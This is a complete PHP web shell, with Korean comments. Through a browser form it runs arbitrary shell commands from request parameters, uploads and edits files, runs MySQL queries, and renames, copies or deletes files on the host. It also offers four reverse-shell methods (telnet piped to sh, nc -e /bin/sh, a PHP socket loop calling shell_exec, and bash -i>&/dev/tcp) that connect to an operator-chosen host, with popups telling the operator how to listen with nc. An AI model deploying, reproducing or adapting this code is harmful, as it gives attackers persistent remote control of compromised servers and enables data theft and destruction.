<?php
ini_set("display_errors", 0);
date_default_timezone_set("Asia/Pyongyang");

function g($n)
{
	if (isset($_POST[$n]))	return $_POST[$n];
	else
		if (isset($_GET[$n]))	return $_GET[$n];
		else	return '';
}

// command
$command	= g("command");
$cmd		= g("cmd");
// reverse
$reverse1	= g("reverse1");
$reverse2	= g("reverse2");
$reverse3	= g("reverse3");
$reverse4	= g("reverse4");
$urip		= g("urip");
$urport		= g("urport");
$urip2		= g("urip2");
$urport2	= g("urport2");
// vi
$save_text	= g("save_text");
$fname		= g("fname");
// explorer
$path		= g("path");
$mode		= g("mode");
$file		= g("file");
$newfilename	= g("newfilename");
$overwrite	= g("overwrite");

echo "<HTML>
<BODY bgcolor=black>
<p style='line-height:10mm;color:#CCCCCC;'>Commands are :
<font color=#F38900><a onfocus=blur() onclick=location.href='".$_SERVER['PHP_SELF']."?command=ls%20-al' style='cursor:hand'>Shell</a></font>,
<font color=#F38900>VI</font> [filename], 
<font color=#F38900>SQL</font> [server] [id] [pw] [db],
<font color=#F38900><a onfocus=blur() onclick=location='".$_SERVER['PHP_SELF']."?command=rz' style='cursor:hand';>File Upload</a></font>,
<font color=#F38900><a onfocus=blur() onclick=location='".$_SERVER['PHP_SELF']."?command=reverse' style='cursor:hand'>Reverse Connect</a></font>,
<font color=#F38900><a onfocus=blur() onclick=location='".$_SERVER['PHP_SELF']."?command=explorer' style='cursor:hand'>Explorer</a></font>";

$cancel="<INPUT type=button value=Cancel!! onclick=document.location='".$_SERVER['PHP_SELF']."'>";
if( !$command ) $command="explorer";

// reverse connector
if(substr($command,0,7)=="reverse" && strlen($command)==7)
{
	echo "
		<script>
		function reverse1_help() { alert('1. Run Command in your computer like this : nc -l -p 5555\\n2. Also run like this in another command prompt : nc -l -p 5556\\n3. If you click the \'Connect\' button, you should be delighted.\\n4. If you enter the arbitrary command to prompt(1), then you can see the result in another prompt'); }
		function reverse2_help() { alert('1. Run Command in your computer like this : nc -l -p 5555\\n2. Input your IP Address & Port and Click the button then establish.\\n3. Let\'s enter the command if u want to.'); }
		</script>

		<BODY bgcolor=black onload=reverseform1.urip.focus();><HR><font color=#cccccc size=2>which do u want?<br>
		<form method=post action=".$_SERVER['PHP_SELF']." name=reverseform1>
			<input type=hidden name=command value=$command>
			<input type=hidden name=reverse1 value=1>
			<font color=#cccccc>1)<font color=red> telnet
			<input type=text name=urip value='' placeholder='".$_SERVER['REMOTE_ADDR']."' style='border:0;background-color:#444444;color:#cccccc;width:100;height:18'>
			<input type=text name=urport value='' placeholder='5555' style='border:0;background-color:#444444;color:#cccccc;width:40;height:18'>| sh | telnet
			<input type=text name=urip2 value='' placeholder='".$_SERVER['REMOTE_ADDR']."' style='border:0;background-color:#444444;color:#cccccc;width:100;height:18'>
			<input type=text name=urport2 value='' placeholder='5556' style='border:0;background-color:#444444;color:#cccccc;width:40;height:18'> &nbsp; &nbsp; &nbsp; &nbsp;
			<input type=submit value=Connect onclick=document.location='".$_SERVER['PHP_SELF']."?command=$command'> &nbsp; <font size=2 color=#cccccc>
			<a onfocus=blur() style='cursor:hand' onclick=reverse1_help()>[HELP]</a>
		</form>
		<form method=post action='".$_SERVER['PHP_SELF']."' name=reverseform2>
			<input type=hidden name=command value=$command>
			<input type=hidden name=reverse2 value=1>
			<font color=#cccccc>2)<font color=red> nc -e /bin/sh 
			<input type=text name=urip value='' placeholder='".$_SERVER['REMOTE_ADDR']."' style='border:0;background-color:444444;color:#cccccc;width:100;height:18'>
			<input type=text name=urport value='' placeholder='5555'  style='border:0;background-color:444444;color:#cccccc;width:40;height:18'>&nbsp; &nbsp;
			<input type=submit value=Connect onclick=document.location='".$_SERVER['PHP_SELF']."?command=$command'> &nbsp; <font size=2 color=#cccccc>
			<a onfocus=blur() style='cursor:hand' onclick=reverse2_help()>[HELP]</a>
		</form>
		<form method=post action='".$_SERVER['PHP_SELF']."' name=reverseform3>
			<input type=hidden name=command value=$command>
			<input type=hidden name=reverse3 value=1>
			<font color=#cccccc>3)<font color=red> reverse connect via socket
			<input type=text name=urip value='' placeholder='".$_SERVER['REMOTE_ADDR']."' style='border:0;background-color:444444;color:#cccccc;width:100;height:18'>
			<input type=text name=urport value='' placeholder='5555' style='border:0;background-color:444444;color:#cccccc;width:40;height:18'> &nbsp; &nbsp;
			<input type=submit value=Connect onclick=document.location='".$_SERVER['PHP_SELF']."?command=$command'> &nbsp; <font size=2 color=#cccccc>
			<a onfocus=blur() style='cursor:hand' onclick=reverse2_help()>[HELP]</a>
		</form>
		<form method=post action='".$_SERVER['PHP_SELF']."' name=reverseform4>
			<input type=hidden name=command value=$command>
			<input type=hidden name=reverse4 value=1>
			<font color=#cccccc>4)<font color=red> bash -i>&/dev/tcp/
			<input type=text name=urip value='' placeholder='".$_SERVER['REMOTE_ADDR']."' style='border:0;background-color:444444;color:#cccccc;width:100;height:18'>/
			<input type=text name=urport value='' placeholder='5555' style='border:0;background-color:444444;color:#cccccc;width:40;height:18'> 0>&1 &nbsp; &nbsp;
			<input type=submit value=Connect onclick=document.location='".$_SERVER['PHP_SELF']."?command=$command'> &nbsp; <font size=2 color=#cccccc>
			<a onfocus=blur() style='cursor:hand' onclick=reverse2_help()>[HELP]</a>
		</form>


		<br><br><br>$cancel";

		// reverse shell - telnet
		if( $reverse1 )
		{
			//$con_str=`sleep 7777|telnet $urip $urport|sh|telnet $urip2 $urport2`; // 2Hour 16Minutes
			$con_str=`telnet $urip $urport|sh|telnet $urip2 $urport2`; // 2Hour 16Minutes
		}

		// reverse shell - nc
		if( $reverse2 )
		{
			$con_str=`nc -e /bin/sh $urip $urport`;
		}

		// reverse shell - socket
		if( $reverse3 )
		{
			ini_set('max_execution_time',0);
			$sockfd = fsockopen($urip, $urport, $errno, $errstr);
			if(!$sockfd) die(0);
			fputs($sockfd, "Connected\n");
			while(!feof($sockfd))
			{ 
				fputs ($sockfd , "cmd) ");
				$command = trim(fgets($sockfd, 2048));
				fputs($sockfd , shell_exec($command));
			}
			fclose($sockfd);
			die(0);
		}
		// reverse shell - tcp device
		if( $reverse4 )
		{
			$con_str=`bash -i>&/dev/tcp/$urip/$urport 0>&1`;
		}
		exit;
}

// File Upload
if(substr($command,0,2)=="rz" && strlen($command)==2)
{
	echo "<BODY bgcolor=black>";

	if(!$_FILES["upload1"] && !$_FILES["upload2"] && !$_FILES["upload3"])
		echo "<FORM method=post action='".$_SERVER['PHP_SELF']."' name='uploadform' enctype='multipart/form-data'>
		<input type=hidden name=command value=$command>
		<input type=file name=upload1 size=100 style='background-color: #aaaaaa;'><br>
		<input type=file name=upload2 size=100 style='background-color: #aaaaaa;'><br>
		<input type=file name=upload3 size=100 style='background-color: #aaaaaa;'><br>
		<input type=submit value=Upload!!> $cancel
		</FORM>";
	else
	{
		$fname1=$_FILES["upload1"]["name"];
		$fname2=$_FILES["upload2"]["name"];
		$fname3=$_FILES["upload3"]["name"];
		if(!@move_uploaded_file($_FILES["upload1"]["tmp_name"], $fname1) &&
			!@move_uploaded_file($_FILES["upload2"]["tmp_name"], $fname2) &&
			!@move_uploaded_file($_FILES["upload3"]["tmp_name"], $fname3))
			die("<p><font color=red>Upload Failed $cancel");

		echo "<script>document.location='".$_SERVER['PHP_SELF']."?command=ls%20-al';</script>";
	}
	exit;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// vi - save edited file
if($save_text)
{
	$save_text=str_replace("\\","",$save_text);
	$wfp=@fopen($fname,"w") or die("<br><script>alert('Error!\\nCheck write permission!');history.back();</script>");
	fwrite($wfp, $save_text, strlen($save_text));
	fclose($wfp);
	echo "<script>history.go(-2);</script>";
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// vi editor
if(substr($command,0,3)=="vi ")
{
	$org_cmd=str_replace(" ","%20",$command);
	$str=explode(" ", $command);

	if(file_exists($str[1])) $isfile=1;

	if($isfile) $fp=@fopen($str[1],"r");
	else        $fp=@fopen($str[1],"w");
	if($isfile) { $text=@fread($fp,filesize($str[1]));  @fclose($fp); }

	echo "<BODY onload=modify.save_text.focus(); bgcolor=black>";
	echo "<br>- FileName : <font color=red>$str[1]";
	echo "<FORM name=modify action='".$_SERVER['PHP_SELF']."' method='POST'>
		<INPUT TYPE=hidden NAME=fname value='".$str[1]."'>
		<INPUT TYPE=submit NAME=Save VALUE='Save' onClick=document.location='".$_SERVER['PHP_SELF']."'?command=ls%20-al';>&nbsp;
		<INPUT TYPE=button NAME=command VALUE='Back' onClick='history.back();'><p>
		<TEXTAREA NAME=save_text STYLE='width:100%;height:500'>".$text."</textarea>
		</FORM>";
	exit;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// SQL Executor
if(substr($command,0,4)=="sql ")
{
	$str=explode(" ", $command);

	if($str[4]) // 인자 수 확인
	{
		echo "
			<html>
			<head>
			<script>
			function make_str(mode)
			{
				if(mode=='con')
				{
					f=document.conn;
					var c=f.serv.value+' '+f.dbid.value+' '+f.dbpw.value+' '+f.dbnm.value;
					document.location='".$_SERVER['PHP_SELF']."?command=sql '+c;
					return 1;
				}
				else if(mode=='cmd')
				{
					f=document.conn; g=document.sql;
					var c=f.serv.value+' '+f.dbid.value+' '+f.dbpw.value+' '+f.dbnm.value;
					var d=g.cmd.value;
					document.location='".$_SERVER['PHP_SELF']."?command=sql '+c+'&cmd='+d;
					return 1;
				}
				return 0;
			}
			</script>

			</head>
			<BODY onload=sql.cmd.focus(); bgcolor=black color=#CCCCCC>
			<font size=2 color=#cccccc>
			<HR>
			<FORM name=conn action='".$_SERVER['REQUEST_URI']."' method=post>
			Server: <input type=text name=serv size=19 value=$str[1]>&nbsp;&nbsp; 
			DB_ID: <input type=text name=dbid size=14 value=$str[2]>&nbsp;&nbsp; 
			DB_PW: <input type=text name=dbpw size=14 value=$str[3]>&nbsp;&nbsp; 
			DB_Name: <input type=text name=dbnm size=14 value=$str[4]> &nbsp;&nbsp; 
			<input type=button value='Connect!!' onclick=make_str('con');> $cancel
			</FORM>
			<HR>
			<FORM name=sql action='".$_SERVER['REQUEST_URI']."' method=post>
			<input type=hidden name=command value='$command'>
			<span style='color:#cccccc;font-family:Fixedsys'>
			mysql> <input type=text name=cmd value='' size=60 style='border:1 px;background-color:black; color:#cccccc'> [History: $cmd]
			<input type=button value='Enter' onclick=make_str('cmd')>
			</FORM>
			<br><br>
			</BODY>
			</html>";
	}
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// SQL 연결이 성립 된 이후~
if($cmd || (!$cmd&&substr($command,0,4)=="sql "))
{
	echo "<FONT face=Gulimche size=2>";
	try
	{
		// mysql 8
		$conn=mysqli_connect($str[1], $str[2], $str[3], $str[4]) or die("<br><br><font color=red>Error : mysql_connect()<br><br><INPUT TYPE=button value=Back onclick='history.back()'>");

		if($cmd) // SQL 질의어가 있을 때
		{
			$query=mysqli_query($conn, $cmd) or die("<br><br><font color=red>Error : mysql_query()<br><br><INPUT TYPE=button value=Back onclick='history.back()'>");
			$cnt=mysqli_num_rows($query);
			$cnt2=mysqli_num_fields($query);
			$max=array('');

			// 전체 레코드 중 각 필드의 최대 값 저장
			for($i=0;$i<$cnt;$i++)
			{
				mysqli_data_seek($query, $i) or die("<br><br><font color=red>Error: mysql_data_seek()<br><br><INPUT TYPE=button value=Back onclick='history.back()'>");
				$data=mysqli_fetch_array($query) or die("<br><br><font color=red>Error : mysql_fetch_array()<br><br><INPUT TYPE=button value=Back onclick='history.back()'>");
				for($j=0;$j<$cnt2;$j++)
					if(strlen($data[$j])>$max[$j])
						$max[$j]=strlen($data[$j]);
			}

			for($i=0;$i<$cnt;$i++) // 열 수 만큼
			{
				mysqli_data_seek($query, $i);
				$data=mysqli_fetch_array($query);
				for($j=0;$j<$cnt2;$j++) // 필드 수 만 큼
				{
					echo $data[$j]; // 필드 값
					for($l=strlen($data[$j]);$l<$max[$j];$l++) echo "&nbsp;"; // 정렬하기->PADDING
					if($j!=$cnt2-1) echo " | ";  // 구분기호

				} // 필드 수 만큼
				echo "<br>";
			} // 열 수 만큼 출력
		} // 쿼리가 있을 경우
	}
	catch(Error $e)
	{
		// mysql old
		$connect=mysql_connect($str[1], $str[2], $str[3]) or die("<br><br><font color=red>Error : mysql_connect()<br><br><INPUT TYPE=button value=Back onclick='history.back()'>");
		mysql_select_db($str[4], $connect) or die("<br><br><font color=red>Error : msyql_select_db()<br><br><INPUT TYPE=button value=Back onclick='history.back()'>");

		if($cmd) // SQL 질의어가 있을 때
		{
			$query=@mysql_query($cmd) or die("<br><br><font color=red>Error : mysql_query()<br><br><INPUT TYPE=button value=Back onclick='history.back()'>");
			$cnt=@mysql_num_rows($query);
			$cnt2=@mysql_num_fields($query);
			$max=array('');

			// 전체 레코드 중 각 필드의 최대 값 저장
			for($i=0;$i<$cnt;$i++)
			{
				@mysql_data_seek($query, $i) or die("<br><br><font color=red>Error: mysql_data_seek()<br><br><INPUT TYPE=button value=Back onclick='history.back()'>");
				$data=@mysql_fetch_array($query) or die("<br><br><font color=red>Error : mysql_fetch_array()<br><br><INPUT TYPE=button value=Back onclick='history.back()'>");
				for($j=0;$j<$cnt2;$j++) if(strlen($data[$j])>$max[$j]) $max[$j]=strlen($data[$j]);
			}

			for($i=0;$i<$cnt;$i++) // 열 수 만큼
			{
				@mysql_data_seek($query, $i);
				$data=@mysql_fetch_array($query);
				for($j=0;$j<$cnt2;$j++) // 필드 수 만 큼
				{
					echo $data[$j]; // 필드 값
					for($l=strlen($data[$j]);$l<$max[$j];$l++) echo "&nbsp;"; // 정렬하기->PADDING
					if($j!=$cnt2-1) echo " | ";  // 구분기호

				} // 필드 수 만큼
				echo "<br>";
			} // 열 수 만큼 출력
		} // 쿼리가 있을 경우

	}

	echo "</FONT><br><hr>";
	exit;

} // 쿼리가 있거나, 쿼리가없고 명령만있을 때


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Explorer
if(substr($command,0,8)=="explorer")
{
	echo "
	<script language='JavaScript'>
		var select_obj=null;
		function LayerAction(name, stat)
		{ 
			var obj=document.all[name];
			var _tmpx,_tmpy, marginx, marginy;
			_tmpx = event.clientX + parseInt(obj.offsetWidth);
			_tmpy = event.clientY + parseInt(obj.offsetHeight);
			_marginx = document.body.clientWidth - _tmpx;
			_marginy = document.body.clientHeight - _tmpy;

			if(_marginx < 0)
				_tmpx = event.clientX + document.body.scrollLeft + _marginx ;
			else
				_tmpx = event.clientX + document.body.scrollLeft ;
			if(_marginy < 0)
				_tmpy = event.clientY + document.body.scrollTop + _marginy +20;
			else
				_tmpy = event.clientY + document.body.scrollTop ;

			obj.style.left=_tmpx - 15;
			obj.style.top=_tmpy - 20;

			if(stat=='visible') {
				if(select_obj) {
					select_obj.style.visibility='hidden';
					select_obj=null;
				}
				select_obj=obj;
			}else{
				select_obj=null;
			}

			obj.style.visibility=stat;
		}

		function View_Layer(name, file, edit, copy, rename, del, newfolder, newfile, path)
		{
			var printHeight = 0;
			var printMain='';
			printMain = \"<tr bgcolor=#111111 align=center><td style=color:red;font-size:9pt;font-family:Gulimche height=18 nowrap>\"+file+\"</td></tr>\";
			printHeight = printHeight + 16;

			if(file) {
				printMain = printMain+\"<tr onMouseOver=this.style.backgroundColor='#555555' onMouseOut=this.style.backgroundColor='' align=center onMousedown=window.open('\"+file+\"');><td style=color:white;font-size:9pt;font-family:Gulimche height=18 nowrap>:: Browser :: </td></tr>\";
				printHeight = printHeight + 16;
			}
			if(edit) {
				printMain = printMain+\"<tr onMouseOver=this.style.backgroundColor='#555555' onMouseOut=this.style.backgroundColor='' align=center onMousedown=location='".$_SERVER['PHP_SELF']."?command=vi%20\"+path+\"'><td style=color:white;font-size:9pt height=18 nowrap>:: Edit :: </td></tr>\";
				printHeight = printHeight + 16;
			}
			if(rename) {
				printMain = printMain+\"<tr onMouseOver=this.style.backgroundColor='#555555' onMouseOut=this.style.backgroundColor='' align=center onMousedown=location='".$_SERVER['PHP_SELF']."?command=explorer&path=\"+path+\"&mode=rename'><td style=color:white;font-size:9pt height=18 nowrap>:: Rename :: </td></tr>\";
				printHeight = printHeight + 16;
			}
			if(copy) {
				printMain = printMain+\"<tr onMouseOver=this.style.backgroundColor='#555555' onMouseOut=this.style.backgroundColor='' align=center onMousedown=location='".$_SERVER['PHP_SELF']."?command=explorer&path=\"+path+\"&mode=copy'><td style=color:white;font-size:9pt height=18 nowrap>:: Copy :: </td></tr>\";
				printHeight = printHeight + 16;
			}
			if(del) {
				printMain = printMain+\"<tr onMouseOver=this.style.backgroundColor='#555555' onMouseOut=this.style.backgroundColor='' align=center onMousedown=location='".$_SERVER['PHP_SELF']."?command=explorer&path=\"+path+\"&mode=del'><td style=color:white;font-size:9pt height=18 nowrap>:: Delete :: </td></tr>\";
				printHeight = printHeight + 16;
			}
			if(newfile) {
				printMain = printMain+\"<tr onMouseOver=this.style.backgroundColor='#555555' onMouseOut=this.style.backgroundColor='' align=center onMousedown=location='".$_SERVER['PHP_SELF']."?command=explorer&path=\"+path+\"&mode=newfile';><td style=color:white;font-size:9pt height=18 nowrap>:: New File :: </td></tr>\";
				printHeight = printHeight + 16;
			}
			if(newfolder) {
				printMain = printMain+\"<tr onMouseOver=this.style.backgroundColor='#555555' onMouseOut=this.style.backgroundColor='' align=center onMousedown=location='".$_SERVER['PHP_SELF']."?command=explorer&path=\"+path+\"&mode=newfolder';><td style=color:white;font-size:9pt height=18 nowrap>:: New Directory :: </td></tr>\";
				printHeight = printHeight + 16;
			}
			if(true) {
				printMain = printMain+\"<tr onMouseOver=this.style.backgroundColor='#555555' onMouseOut=this.style.backgroundColor='' align=center onMousedown='window.close()'><td style=color:white;font-size:9pt height=18 nowrap>:: Close [X] :: </td></tr>\";
				printHeight = printHeight + 16;
			}

			var printHeader = \"<div id='\"+name+\"' style='position:absolute; left:20px; top:20px; width:130; height: \"+printHeight+\"; z-index:1; visibility: hidden' onMousedown=LayerAction('\"+name+\"','hidden')><table border=0><tr><td colspan=3 onMouseover=LayerAction('\"+name+\"','hidden') height=3></td></tr><tr><td width=5 onMouseover=LayerAction('\"+name+\"','hidden') rowspan=2>&nbsp;</td><td height=5></td></tr><tr><td><table style=cursor:hand border='0' cellspacing='1' cellpadding='0' bgcolor='black' width=100% height=100%><tr><td valign=top bgcolor=white><table border=1 bgcolor=black cellspacing=0 cellpadding=3 width=100% height=100% style='font-family:Gulimche'>\";
			var printFooter = \"</table></td></tr></table></td><td width=5 rowspan=2 onMouseover=LayerAction('\"+name+\"','hidden')>&nbsp;</td></tr><tr><td colspan=3 height=10 onMouseover=LayerAction('\"+name+\"','hidden')></td></tr></table></div>\";
			document.writeln(printHeader+printMain+printFooter);
		}
	</script>
	";

	// explorer + rename
	if( $mode == "rename" || $mode == "copy" )
	{
		if( file_exists($path) )
		{
			if( !isset($newfilename) || strlen($newfilename) == 0 )
			{
				echo "
					<script>
					var filename=prompt('Enter New Filename', '".$path."');
					if( filename != '' || filename != null || filename.Length < 1 )
						location.href=\"".$_SERVER['PHP_SELF']."?command=".$command."&path=".$path."&mode=".$mode."&newfilename=\"+filename;
					else
						location.href='history.back()';
					</script>";
			}
			else if( $newfilename == "null" )
			{
				echo "<script>document.location='".$_SERVER['PHP_SELF']."?command=".$command."';</script>";
			}
			else
			{
				echo "newfilename(".strlen($newfilename).") : $newfilename<br>";
				echo "overwrite (".strlen($overwrite).")  : $overwrite<br>";
				if( file_exists($newfilename) && $overwrite != true )
				{
					echo "
						<script>
							if( confirm('already exsist. overwrite?') == true )
								location.href=\"".$_SERVER['PHP_SELF']."?command=".$command."&path=".$path."&mode=".$mode."&newfilename=".$newfilename."&overwrite=true\";
							else
								location.href='".$_SERVER['PHP_SELF']."?command=".$command."';

						</script";
				}
				else
				{
					if( $mode == "rename" )
						rename($path, $newfilename);
					else if( $mode == "copy" )
						copy($path, $newfilename);

					echo "<script>document.location='".$_SERVER['PHP_SELF']."?command=".$command."';</script>";
				}
			}
		
		}
	}
	else if( $mode == "del" )
	{
		if( file_exists($path) )
		{
			if( $overwrite != true)
			{
				echo "
				<script>
					if( confirm('Are you sure you want to delete the \'".$path."\' file?') == true )
						location.href=\"".$_SERVER['PHP_SELF']."?command=".$command."&path=".$path."&mode=".$mode."&overwrite=true\";
					else
						location.href='".$_SERVER['PHP_SELF']."?command=".$command."';

				</script";
			}
			else
			{
				unlink($path);
				echo "<script>document.location='".$_SERVER['PHP_SELF']."?command=".$command."';</script>";
			}

		}
	}
	else if( $mode == "newfile" )
	{
		if( !isset($path) || !isset($newfilename) || $newfilename == "" )
		{
			echo "
				<script>
				var filename=prompt('Enter the file name you want to create');
				if( filename != '' || filename != null || filename.Length < 1 )
					location.href=\"".$_SERVER['PHP_SELF']."?command=".$command."&path=".$path."&mode=".$mode."&newfilename=\"+filename;
				else
					location.href='history.back()';
				</script>";
		}
		else if( $newfilename == "null" )
		{
			 echo "<script>document.location='".$_SERVER['PHP_SELF']."?command=".$command."';</script>";
		}
		else
		{
			$pi = pathinfo($path);
			touch($pi['dirname']."/".$newfilename);
			echo "<script>document.location='".$_SERVER['PHP_SELF']."?command=".$command."';</script>";
		}
	}
	else if( $mode == "newfolder" )
	{
		if( !isset($path) || !isset($newfilename) || $newfilename == "" )
		{
			echo "
				<script>
				var filename=prompt('Enter the directory name you want to create');
				if( filename != '' || filename != null || filename.Length < 1 )
					location.href=\"".$_SERVER['PHP_SELF']."?command=".$command."&path=".$path."&mode=".$mode."&newfilename=\"+filename;
				else
					location.href='history.back()';
				</script>";
		}
		else if( $newfilename == "null" )
		{
			 echo "<script>document.location='".$_SERVER['PHP_SELF']."?command=".$command."';</script>";
		}
		else
		{
			$pi = pathinfo($path);
			mkdir($pi['dirname']."/".$newfilename, 0777);
			echo "<script>document.location='".$_SERVER['PHP_SELF']."?command=".$command."';</script>";
		}
	}
	else
	{
		// explorer
		echo "<BODY bgcolor=black><HR>";
		echo "<font size=2>";
		
		if( !$path ) $path=".";
		try
		{
			$dirlist = @scandir($path);
			if(!$dirlist)
				throw new Exception('scandir error!');

			function cmp($a, $b)
			{

                return  is_dir ($a)
                    ? (is_dir ($b) ? strnatcasecmp ($a, $b) : -1)
                    : (is_dir ($b) ? 1 : (
                        strcasecmp (pathinfo ($a, PATHINFO_EXTENSION), pathinfo ($b, PATHINFO_EXTENSION)) == 0
                        ? strnatcasecmp ($a, $b)
                        : strcasecmp (pathinfo ($a, PATHINFO_EXTENSION), pathinfo ($b, PATHINFO_EXTENSION))
                    ));
			}

			usort($dirlist, "cmp");

			function perm2str($dir)
			{
				$perms = fileperms($dir);

				switch ($perms & 0xF000)
				{
					case 0xC000: // socket
					$info = 's';
					break;
					case 0xA000: // symbolic link
					$info = 'l';
					break;
					case 0x8000: // regular
					$info = '-';
					break;
					case 0x6000: // block special
					$info = 'b';
					break;
					case 0x4000: // directory
					$info = 'd';
					break;
					case 0x2000: // character special
					$info = 'c';
					break;
					case 0x1000: // FIFO pipe
					$info = 'p';
					break;
					default: // unknown
					$info = 'u';
				}

				// Owner
				$info .= (($perms & 0x0100) ? 'r' : '-');
				$info .= (($perms & 0x0080) ? 'w' : '-');
				$info .= (($perms & 0x0040) ?
					 (($perms & 0x0800) ? 's' : 'x' ) :
					 (($perms & 0x0800) ? 'S' : '-'));

				// Group
				$info .= (($perms & 0x0020) ? 'r' : '-');
				$info .= (($perms & 0x0010) ? 'w' : '-');
				$info .= (($perms & 0x0008) ?
					 (($perms & 0x0400) ? 's' : 'x' ) :
					 (($perms & 0x0400) ? 'S' : '-'));

				// Other
				$info .= (($perms & 0x0004) ? 'r' : '-');
				$info .= (($perms & 0x0002) ? 'w' : '-');
				$info .= (($perms & 0x0001) ?
					 (($perms & 0x0200) ? 't' : 'x' ) :
					 (($perms & 0x0200) ? 'T' : '-'));

				return $info;
			}

			function printUidGid($dir)
			{
				$uid = fileowner($dir);
				$gid = filegroup($dir);
				return str_replace(" ", "&nbsp;", sprintf("&nbsp;&nbsp;%-5d %-5d&nbsp", $uid, $gid));
			}

			function getFilesize($f)
			{
				return str_replace(" ", "&nbsp;", sprintf("&nbsp;%12d ", filesize($f)));
			}

			for($i=0; $i<count($dirlist); $i++)
			{
				$dir = $path."/".$dirlist[$i];

				if( is_dir($dir) == true )
				{
					echo "<FONT color=#1791ea face=Gulimche><A onfocus=blur() onClick=document.location='".$_SERVER['PHP_SELF']."?command=".$command."&path=".$path."/".$dirlist[$i]."' style='cursor:hand'>
						[D] ".perm2str($dir)." ".printUidGid($dir)." ".date("Y/m/d H:i", filemtime($dir))." ".getFilesize($dir)." &nbsp;".$dirlist[$i]."</A></FONT><BR>";

				}
				else
				{
					echo "<script>View_Layer('Layer$i', '$dirlist[$i]', '1', '1', '1', '1', '1', 'newfile', '$dir');</script>\n";
					echo "<FONT color=#cccccc face=Gulimche><SPAN onfocus=blur() onmouseover='LayerAction(\"Layer$i\",\"visible\", event, this);' style='cursor:hand'>
						[F] ".perm2str($dir)." ".printUidGid($dir)." ".date("Y/m/d H:i", filemtime($dir))." ".getFilesize($dir)." &nbsp;".$dirlist[$i]."</SPAN><BR>";
				}

			}
		}
		catch(Exception $e)
		{
			echo "explorer error : ".$e->getMessage();
		}
	}

	echo "
	</BODY>
	</HTML>";
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Command Executor
else
{
	$command = str_replace("\\", "", $command); $result = `$command`;
	$info = str_replace("\n", "", "[".`whoami`."@".`hostname -s`." ".`pwd`."]$");

	echo "
		<BODY onload='xcu.command.focus()' bgcolor=black><FONT color=#cccccc>
		<FORM name=xcu action='".$_SERVER['REQUEST_URI']."' method=post>
		$info <INPUT TYPE=TEXT NAME=command VALUE='' SIZE=45 style=border:1 px;background-color:black;color:#cccccc> [History : $command]
		<INPUT TYPE=SUBMIT VALUE='Enter'>
		<HR><XMP>\n$result</XMP></FONT><HR>
		</BODY>
		</FORM>
		</HTML>";
} // else
?>

